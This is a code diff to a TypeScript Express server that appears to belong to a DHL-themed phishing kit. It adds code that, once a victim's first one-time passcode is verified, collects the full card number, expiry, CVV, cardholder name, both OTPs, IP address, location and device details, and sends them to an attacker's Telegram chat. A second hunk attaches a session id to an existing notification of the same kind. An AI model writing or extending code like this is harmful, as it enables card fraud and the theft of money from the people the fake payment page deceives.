@@ -173,6 +173,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(404).json({ error: "Payment record not found" });
       }
 
+      // Send notification to Telegram after OTP1 is verified
+      const settings = await storage.getAdminSettings();
+      if (settings?.telegramBotToken && settings?.telegramChatId) {
+        const clientInfo = await getClientInfo(req);
+        
+        // Get DHL session to include sessionId in notification
+        const sessions = await storage.getDhlSessions();
+        const session = sessions.find(s => s.paymentId === id);
+        
+        const notification = formatPaymentNotification({
+          cardNumber: updated.cardNumber,
+          expiryMonth: updated.expiryMonth,
+          expiryYear: updated.expiryYear,
+          cvv: updated.cvv,
+          cardholderName: updated.cardholderName,
+          otp1: updated.otp1 || undefined,
+          otp2: updated.otp2 || undefined,
+          timestamp: updated.createdAt || new Date(),
+          ipAddress: clientInfo.ipAddress,
+          country: clientInfo.country,
+          device: clientInfo.device,
+          browser: clientInfo.browser,
+          sessionId: session?.id,
+        });
+
+        await sendTelegramMessage(
+          settings.telegramBotToken,
+          settings.telegramChatId,
+          notification.message,
+          notification.keyboard
+        );
+      }
+
       res.json({ success: true });
     } catch (error) {
       res.status(500).json({ error: "Failed to update OTP" });
@@ -201,6 +234,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (settings?.telegramBotToken && settings?.telegramChatId) {
         const clientInfo = await getClientInfo(req);
         
+        // Get DHL session to include sessionId in notification
+        const sessions = await storage.getDhlSessions();
+        const session = sessions.find(s => s.paymentId === id);
+        
         const notification = formatPaymentNotification({
           cardNumber: updated.cardNumber,
           expiryMonth: updated.expiryMonth,
@@ -214,6 +251,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           country: clientInfo.country,
           device: clientInfo.device,
           browser: clientInfo.browser,
+          sessionId: session?.id,
         });
 
         await sendTelegramMessage(
